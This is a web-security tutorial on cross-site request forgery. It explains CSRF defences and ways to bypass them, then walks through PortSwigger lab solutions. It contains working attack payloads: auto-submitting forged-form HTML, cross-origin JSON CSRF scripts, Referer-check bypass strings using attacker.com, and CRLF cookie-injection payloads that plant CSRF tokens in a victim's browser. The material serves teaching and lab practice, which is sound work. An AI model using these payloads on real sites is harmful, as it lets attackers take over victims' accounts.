# CSRF

### Introduction

Before directly jumping into the blog, let's understand what is CSRF. Imagine you're browsing a social media website and there is an email update feature. When you enter your new email and click on the update button, the following request is going to be sent from your browser to the server:

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com

```

Now once the server receives your request, it'll identify you based on your cookies and update the email associated with your account.

Now what if someone managed to send the above request from your browser without your knowledge? This can be done by sending a URL to the victim and tricking them to click on it. To be more clear, the attacker can host the following HTML file in his server and send the URL to the victim:

```html
<html>
<body>
<form action="https://socialmedia.com/update-email" method="POST">
<input type="hidden" name="email" value="mynewemail&#64;gmail&#46;com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

Point to be noted that your browser will automatically send the cookies to any request sent to socialmedia.com (unless *SameSite* is set to `strict` or `lax`). So, the server receives the request and updates the email associated with your account without your knowledge.

This is called Cross-site Request Forgery where the attacker sends a request from the victim's browser to perform unintended actions (in the above scenario, changing the victim's email address without their knowledge) on behalf of the victim.

### Prevention Methodologies

Now there are multiple ways to prevent CSRF. One of the most popular ways is to use an anti-CSRF token (a unique, unpredictable token for each session in every form or request that modifies state). Once the server receives a state-changing request, it'll check for the anti-CSRF token and verify it on the server side before processing the request. The token must be tied to the user's session.

Another popular approach is to use the *SameSite* cookie attribute which will prevent the browser from sending this cookie along with cross-site requests. For example,

```http
Set-Cookie: user_token=1s4gty589tyq; SameSite=Strict;
```

*SameSite* can have 3 possible values - `none`, `lax`, or `strict`.\
The `none` value won't give any kind of protection. It's just like a normal cookie without any attributes.

If the *SameSite* is set to `lax`, the browser will send the cookie in cross-site requests, but only if the request uses the `GET` method and the request results from a top-level navigation by the user, such as clicking on a link. So, the cookies won't be included in cross-site `POST` requests and since `POST` requests are generally used to perform state-changing requests, it'll provide some sort of protection against CSRF attacks.

Lastly, If the *SameSite* is set to `strict`, it means that the browser will not send the cookie in any cross-site requests. Although this is the most secure option, this can break the site in some cases where cross-site requests might be required.

There are many other ways to protect against CSRF such as using JSON/XML body in requests, using HTTP methods other than `GET`/`POST` such as `PUT`/`DELETE`, ensuring presence of a custom header in requests, etc. However, all of the above techniques require proper CORS configuration to ensure protection against CSRF.

### Bypassing CSRF Protection

Now as we know the popular techniques used by the developers to prevent CSRF attacks, let's discuss what common mistakes developers make while implementing these CSRF prevention techniques. We'll choose all the prevention methodologies one by one and discuss the possible ways of bypassing the protection.

#### i. Using Anti-CSRF Token

We already discussed how these anti-CSRF token works. Now let's see what kind of mistakes the developers can make while implementing this:

* Sometimes developers only verify the anti-CSRF token, if it is present in the body. However, if the anti-CSRF token doesn't exist in the body, the server simply accepts the request. In such cases, we can simply remove the entire anti-CSRF token (or just the value) to bypass CSRF protection. For example,

**Original Request**

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com&token=p37w3e44r5e3dqd3838uh1r4y
```

**Modified Request #1 - Removing entire anti-CSRF token**

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com

```

**Modified Request #2 - Removing just the value**

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com&token=

```

* Sometimes it's possible to bypass the CSRF protection by just serving another anti-CSRF token with the same length. For example,

**Original Request**

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com&token=p37w3e44r5e3dqd3838uh1r4y
```

**Modified Request - Using another anti-CSRF token with the same length**

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com&token=p37w3e44r5e3dqd3df8uh1r7y
```

Observe that, the second last digit of the anti-CSRF token is different.

* Sometimes, developers forget to tie the anti-CSRF token with the user's session. Instead, they maintain a global pool of tokens that are generated and issued to the users who are currently logged in to the site. If a request is received, the application will simply check whether the anti-CSRF token, present in the request body, exists in the pool or not.\
  In these cases, an attacker can simply use their anti-CSRF token to generate the CSRF POC.
* Sometimes developers only implement anti-CSRF token validation for `POST` requests. However, they forget to implement the validation when the `GET` method is used.\
  In such cases, it might be possible to convert the request from `POST` to `GET` and remove the token to bypass CSRF protection. For example,

**Original Request**

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com&token=p37w3e44r5e3dqd3838uh1r4y
```

**Modified Request - Changing from `POST` to `GET`**

```http
GET /update-email?email=mynewemail%40gmail.com HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

```

However, this will only work if the application is configured to handle both `POST` and `GET` parameters.

* Sometimes, developers do not store any record of anti-CSRF tokens on the server side. Instead, they return the actual token as a cookie and compare the anti-CSRF token submitted in the request body with the one present in the cookie. Since cookies are stored on the browser, it's not easy to manipulate the anti-CSRF token present in the cookie. This technique is known as *Double-Submit Cookies*.

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq; token=p37w3e44r5e3dqd3838uh1r4y
Referer: https://socialmedia.com

email=mynewemail%40gmail.com&token=p37w3e44r5e3dqd3838uh1r4y

```

This method is quite secure; however, if the application contains any other vulnerabilities (such as XSS, CRLF Injection, etc.) that allow attackers to set a cookie on the victim's browser, the CSRF protection can be bypassed by setting a new token in the cookie and using that token in the CSRF POC.

* Sometimes, although developers implement the CSRF prevention correctly, there might be some other vulnerabilities (such as XSS/CORS Misconfiguration) that may allow an attacker to steal the anti-CSRF token from the victim.

#### ii. Using *SameSite* Attribute

If the *SameSite* is set to `strict`, it's nearly impossible to perform CSRF attacks (unless some other vulnerabilities are present). However, if the *SameSite* is set to `lax`, there are couple of ways to perform CSRF attack. For example, if the application is configured to handle both `POST` and `GET` parameters, we can simply use the following CSRF POC to perform CSRF attack:

```html
<script> 
document.location="https://socialmedia.com/update-email?email=mynewemail%40gmail.com"; 
</script>
```

PortSwigger has a great [blog](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions) on *SameSite* attribute and bypassing *SameSite* cookie restriction. Make sure to read them for more information about *SameSite*.

#### iii. Using JSON Body

Instead of *Form Data* or *Multipart Form Data*, some applications use *JSON* to send data to the server. However, the browser allows only *Form Data* and *Multipart Form Data* to be sent in cross-origin requests (unless allowed by CORS).

There are two ways to perform CSRF attack in these cases.

* In case, the CORS is misconfigured, we may able to perform a CSRF attack. We just need to make sure that the following headers are present in the response:

```http
Access-Control-Allow-Origin: https://attacker.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
```

Let's understand each header one-by-one:

`Access-Control-Allow-Origin` specifies which origins are permitted to access the resource.\
`Access-Control-Allow-Credentials` should be set to `true` if the request requires credentials (like cookies). Otherwise, credentials will not be sent with the request.\
`Access-Control-Allow-Methods` indicates the HTTP methods that are allowed when accessing the resource.\
`Access-Control-Allow-Headers` specifies which HTTP headers can be used during the actual request.

Note: If both `Access-Control-Allow-Origin` is set to `*` and `Access-control-allow-credentials` is set to `true`, the CSRF attack won't be possible since modern browsers will simply ignore it. If `Access-control-allow-origin` is set to `*` then the browser won't allow submitting of credentials (cookies) with the request.

So, if all the above headers are present, we can simply use any of the following CSRF\
POC:

**POC #1 - Using XMLHttpRequest**

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://socialmedia.com/update-email");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"email":"mynewemail@gmail.com"}');
</script>
```

**POC #2 - Using fetch**

```html
<html>
<title>JSON CSRF POC</title>
<body>
<center>
<script>
fetch('https://socialmedia.com/update-email', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body:'{"email": "mynewemail@gmail.com"}'});
</script>
</center>
</body>
</html>
```

* If the CORS is properly configured, we aren't allowed to send JSON data in cross-site requests (because of the restriction of the `application/json` value in `Content-Type`). However, if the following request (observe the `Content-Type`) is considered valid by the server, we can perform the CSRF attack:

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Content-Type: text/plain
Content-Length: 36
Origin: https://socialmedia.com
Referer: https://socialmedia.com

{"email": "mynewemail@gmail.com"}

```

We can simply use the following CSRF POC to generate the above request from the victim's browser:

```html
<html>
<body>
<form  action="https://socialmedia.com/update-email"  method="POST"  enctype="text/plain"  id='myForm'>
<input  type="hidden"  name='{"email": "mynewemail@gmail.com","a":"'  value='a"}'>
</form>
<script>
document.addEventListener('DOMContentLoaded', function(event) {
document.createElement('form').submit.call(document.getElementById('myForm'));
});
</script>
</body>
</html>
```

This will just add an extra parameter to the request body. The final request body will look like:

```json
{"email": "mynewemail@gmail.com","a":"=a"}
```

#### iv. Using HTTP methods other than `GET`/`POST`

Instead of traditional HTTP methods such as `GET`/`POST`, Rest APIs use the `PUT` method to update or create a resource and the `DELETE` method to remove a resource on the server. Again due to CORS, you're not allowed to send cross-site requests that use any HTTP methods other than `GET`/`POST`/`OPTIONS`. If there is no CORS misconfiguration, we can try using `_method` parameter to override the existing method. For example,

**Original Request**

```http
PUT /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com

```

**Modified Request - Changing from `PUT` to `POST`**

```http
POST /update-email HTTP/1.1
Host: socialmedia.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Cookie: sessionId=a1qb2ec132dwf52; user_token=1s4gty589tyq
Referer: https://socialmedia.com

email=mynewemail%40gmail.com&_method=PUT
```

#### v. Custom Header in Request

Sometimes, the application requires a custom header to be present in the request to process the request. For example, instead of using cookies, the application may use the `Authorization` header for handling the user session. Another example would be passing the anti-CSRF token in the header instead of passing it in the body. In such cases, even if CORS allows us to send these headers, it's difficult to find out the value of the header. One approach can be finding another vulnerability (such as XSS) that will allow us to steal the required value.

Otherwise, we can simply remove the entire header (unless the header is responsible for the session) and try generating the CSRF POC.

#### vi. Bypassing Referrer Check

Some applications use the HTTP `Referer` header to protect against CSRF attacks by verifying whether the request originated from the application's domain or not. In these cases, we can try any of the following:

* We can try removing the `Referer` header by adding the following line in our CSRF POC:

```html
<meta name="referrer" content="never">
```

* If the application validates the `Referer` header using some kind of regex, we can try to bypass the regex. For example, we can set any of the following as `Referer`:

```url
https://attacker.com?target.com
https://attacker.com;target.com
https://attacker.com/target.com/../targetPATH
https://target.com.attacker.com
https://attackertarget.com
https://target.com@attacker.com
https://attacker.com#target.com
https://attacker.com\.target.com
https://attacker.com/.target.com
```

***

### Lab: CSRF vulnerability with no defenses <a href="#id-3a80" id="id-3a80"></a>

> This lab’s email change functionality is vulnerable to CSRF.
>
> To solve the lab, craft some HTML that uses a CSRF attack to change the viewer’s email address and upload it to your exploit server.
>
> You can log in to your own account using the following credentials: `wiener:peter`

After logging in, click on “update email” and capture the traffic.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*7tbHA7S59bFgnUZKZBIOqQ.png" alt="" height="353" width="700"><figcaption></figcaption></figure>

Without CSRF token restrictions, generate a CSRF POC (Proof of Concept) directly and copy the HTML to the exploit server.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*i1P-R1Y4FSgHFl0f-Xfsrg.png" alt="" height="499" width="700"><figcaption></figcaption></figure>

Simply deliver the exploit to the victim.

### Lab: CSRF where token validation depends on request method <a href="#cde0" id="cde0"></a>

> This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.
>
> You can log in to your own account using the following credentials: `wiener:peter`

Capture the packet after updating the email.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*a6OLcW6OZDMyAEqnSYltUw.png" alt="" height="414" width="700"><figcaption></figcaption></figure>

After modifying the CSRF token, repeat the process:

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*mVcHii7JUvFP1Sw2Bt8Brw.png" alt="" height="547" width="700"><figcaption></figcaption></figure>

It reminds invalid csrf token.

Changing the POST method to GET was successful.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*a1MnOClIsOzmsG5NS-n-3g.png" alt="" height="463" width="700"><figcaption></figcaption></figure>

Token verification is no longer in place. Similarly, copying the payload to the exploit server is sufficient.

### Lab: CSRF where token validation depends on token being present <a href="#id-0c08" id="id-0c08"></a>

> This lab’s email change functionality is vulnerable to CSRF.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.
>
> You can log in to your own account using the following credentials: `wiener:peter`

Similarly, inspect the captured packets.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*xPe38a6dK_k6-7imZ0Bm3w.png" alt="" height="390" width="700"><figcaption></figcaption></figure>

The CSRF token is present.

After modifying the token, attempting to change the request method is unsuccessful. Try removing the token directly:

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*sde7SJZjPRuFmI9Wl-PuAw.png" alt="" height="402" width="700"><figcaption></figcaption></figure>

It worked.

### Lab: CSRF where token is not tied to user session <a href="#id-013e" id="id-013e"></a>

> This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

All the methods mentioned earlier will fail.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*1mve4ikFvYIax12y5Lmi4Q.png" alt="" height="319" width="700"><figcaption></figcaption></figure>

Click “update,” capture the packet, copy the CSRF token, and then drop it.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*fHQ09xq-P7OgNvI0fggs0w.png" alt="" height="348" width="700"><figcaption></figcaption></figure>

Open a new browser, update the email again, and replace the CSRF token from the previous step.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*8wSnA_hRcGcuApFOJZrtCw.png" alt="" height="265" width="700"><figcaption></figcaption></figure>

Successful modification.

Following the steps of the first lab, generate a CSRF PoC and replace the CSRF token with an unused one.

### Lab: CSRF where token is tied to non-session cookie <a href="#e874" id="e874"></a>

> This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Here are two accounts provided. After logging in, send them to repeater.

It is found that by simultaneously replacing csrfKEY and csrf, the request can be completed normally.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*797C11ScpA-lHao__erMbw.png" alt="" height="389" width="700"><figcaption></figcaption></figure>

There is no CSRF protection in the search field.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*W5eKX0ijm9GI33Vl28zkXQ.png" alt="" height="239" width="700"><figcaption></figcaption></figure>

Therefore, leveraging the search parameter, inject your personal CSRF key into the browser:

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*KAaXXss0jiLAhtaap2GaQw.png" alt="" height="314" width="700"><figcaption></figcaption></figure>

Success.

The final exploitation strategy is to replace both your CSRF key and CSRF at the victim’s end. Inject the CSRF key through injection, and CSRF through the proof of concept (POC).

The injected code is as follows:

```javascript
<img src="https://0a49002f035387ea802130a40049000a.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=lklECpJ0o4k9v2iM63JurrAsOE5DpSZ6%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

Combining with the POC, the exploitation is successful.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*4xPJErWbCc1z3v_3e_HXOw.png" alt="" height="396" width="700"><figcaption></figcaption></figure>

### Lab: CSRF where token is duplicated in cookie <a href="#id-55b9" id="id-55b9"></a>

> This lab’s email change functionality is vulnerable to CSRF. It attempts to use the insecure “double submit” CSRF prevention technique.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

Here, if the CSRF parameter exists in both the cookie and the body, modifying either one individually will result in an error. However, after experimentation, it was found that modifying both simultaneously allows for a successful request.

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*iM4PTOdH4EceFvppqUquBg.png" alt="" height="390" width="700"><figcaption></figcaption></figure>

The following steps are similar to the previous ones.

First, inject the CSRF from the cookie into the victim’s browser using the search feature. Then, provide the victim with a matching CSRF through the POC:

```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aac002b03978751804f446900b400e8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="1213213&#64;11" />
      <input type="hidden" name="csrf" value="test" />
      <input type="submit" value="Submit request" />
    </form>
<img src="https://0aac002b03978751804f446900b400e8.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=test%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
  </body>
</html>
```

### Lab: CSRF where Referer validation depends on header being present <a href="#e050" id="e050"></a>

> This lab’s email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.
>
> To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.

There is no CSRF token here, but there is a restriction on the referer. If the referer is modified, it will result in an unsuccessful request:

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*3HNFjSVCBf6igciGLBiNjw.png" alt="" height="367" width="700"><figcaption></figcaption></figure>

In other words, when using the previous POC to execute an attack, it fails due to inconsistent referer.

Trying to remove the referer:

<figure><img src="https://miro.medium.com/v2/resize:fit:1050/1*zm5VqOAmwKWQE6w6nAowRw.png" alt="" height="316" width="700"><figcaption></figcaption></figure>

Success.

Modify the POC:

```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a1f000c0396e0bd857f3055006f0062.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="11223&#64;11" />
      <input type="submit" value="Submit request" />
   <meta name="referrer" content="no-referrer">
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Deliver the payload and finish it.
